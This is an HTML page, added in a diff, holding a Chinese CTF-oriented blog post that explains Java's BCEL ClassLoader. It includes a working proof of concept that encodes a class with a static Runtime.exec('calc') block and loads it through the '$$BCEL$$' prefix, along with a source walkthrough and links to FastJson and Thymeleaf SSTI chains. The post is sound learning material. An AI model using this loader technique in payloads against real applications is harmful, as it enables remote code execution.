@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>BCEL-ClassLoader赛博学习 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="BCEL-ClassLoader赛博学习 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://boogipop.com/2023/03/21/BCEL-ClassLoader%E8%B5%9B%E5%8D%9A%E5%AD%A6%E4%B9%A0/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-21T10:23:12.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>21,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">BCEL-ClassLoader赛博学习</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel</a></p>
+<h1 id="BCEL到底是什么"><a href="#BCEL到底是什么" class="headerlink" title="BCEL到底是什么"></a>BCEL到底是什么</h1><p>CommonClollections我们都不陌生，Bcel也是位于sun包下的一个项目，是属于Apache Common的一个子项目<br>我在payload经常看到这个东西，所以就简单写一下它的利用方法和原理</p>
+<h1 id="简单分析BCEL-Loadclass"><a href="#简单分析BCEL-Loadclass" class="headerlink" title="简单分析BCEL-Loadclass"></a>简单分析BCEL-Loadclass</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//Class.forName(&quot;$$BCEL$$&quot;+code,true,new ClassLoader());</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span>+code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>就拿这个简单的payload来看，首先通过Repository去读取calc.class文件，随后使用utility.encode对字节流进行编码，最后在编码结果前加上$$BCEL$$即可弹出计算器（注释中的payload也是可以的）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679392655918-9b8e8b3f-f249-4c48-82c1-ab4e0816cf68.png#averageHue=%232a2a26&clientId=ucaaf404a-8e78-4&from=paste&height=662&id=u901c5ace&name=image.png&originHeight=827&originWidth=2432&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2423650&status=done&style=none&taskId=u13a47346-2680-41bd-a5c2-f45655cf3b7&title=&width=1945.6" alt="image.png"></p>
+<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679392844885-db133676-6df2-48fa-9093-6e80a7f88d7c.png#averageHue=%232a2b27&clientId=ucaaf404a-8e78-4&from=paste&height=588&id=u704541a3&name=image.png&originHeight=735&originWidth=1794&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1755483&status=done&style=none&taskId=uafd2c842-efc8-494b-9f9f-7d069cdf666&title=&width=1435.2" alt="image.png"><br>在<code>\com\sun\org\apache\bcel\internal\util\ClassLoader.java</code>中的loadclass方法中存在上面一段代码，判断classname是否以bcel开头，如果是的话就调用createClass方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">    <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">      <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">      clazz = parser.parse();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Adapt the class name to the passed value</span></span><br><span class="line">    <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line"></span><br><span class="line">    <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(),</span><br><span class="line">                                                     Constants.CONSTANT_Class);</span><br><span class="line">    <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(),</span><br><span class="line">                                                     Constants.CONSTANT_Utf8);</span><br><span class="line">    name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>会去除掉BCEL之后进入decode环节进行解密，然后退出来进入下面的if，defineclass<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679393065107-c147cdf2-80ad-4dbd-b3ac-38235b736771.png#averageHue=%23282a27&clientId=ucaaf404a-8e78-4&from=paste&height=534&id=ued24b404&name=image.png&originHeight=667&originWidth=1792&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1579983&status=done&style=none&taskId=ube56cdf3-bc2c-4d53-b633-79be960ed79&title=&width=1433.6" alt="image.png"><br>这里使用java原生的defineclass进行加载，然后newInstance时弹计算机<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679393156019-c4de2551-9e78-42ac-9349-90deaf38717a.png#averageHue=%23333430&clientId=ucaaf404a-8e78-4&from=paste&height=125&id=uf8c8fc44&name=image.png&originHeight=156&originWidth=856&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=209667&status=done&style=none&taskId=u2be6fb06-9c6e-4ab1-a195-85fc52666e5&title=&width=684.8" alt="image.png"><br>貌似和原生的区别也不是很大</p>
+<h1 id="Bcel在各个链子中的利用"><a href="#Bcel在各个链子中的利用" class="headerlink" title="Bcel在各个链子中的利用"></a>Bcel在各个链子中的利用</h1><h2 id="FastJson-BCEL"><a href="#FastJson-BCEL" class="headerlink" title="FastJson BCEL"></a>FastJson BCEL</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/GX233/article/details/124655533">https://blog.csdn.net/GX233/article/details/124655533</a></p>
+<h2 id="Thymeleaf-SSTI-BCEL"><a href="#Thymeleaf-SSTI-BCEL" class="headerlink" title="Thymeleaf SSTI BCEL"></a>Thymeleaf SSTI BCEL</h2><p><a target="_blank" rel="noopener" href="https://turn1tup.github.io/2021/08/10/spring-boot-thymeleaf-ssti/">https://turn1tup.github.io/2021/08/10/spring-boot-thymeleaf-ssti/</a></p>
+<p>懒狗一条</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/CTF/" class="tag">#CTF</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/29/%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9B%E7%9A%84_ezJava_%E5%A4%A7%E6%9D%82%E7%83%A9/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">近期比赛的ezJava大杂烩</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">被我忘掉的Hessian反序列化</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
